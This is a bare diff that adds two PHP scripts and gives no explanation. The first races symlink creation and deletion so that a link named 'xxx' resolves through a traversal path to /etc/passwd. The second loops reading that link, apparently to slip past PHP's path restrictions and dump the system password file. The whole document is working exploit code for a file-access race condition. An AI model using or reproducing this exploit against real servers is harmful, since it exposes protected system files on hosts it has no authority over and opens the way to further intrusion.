@@ -1,0 +1,18 @@
+script1.php
+<?
+   symlink("a/a/a/a/a/a/", "dummy");
+   symlink("dummy/../../../../../../etc/passwd", "xxx");
+   unlink("dummy");
+   while (1) {
+        symlink(".", "dummy");
+        unlink("dummy");
+   }
+?>
+
+script2.php
+<?
+while (1) {
+        print @file_get_contents("xxx");
+}
+?>
+
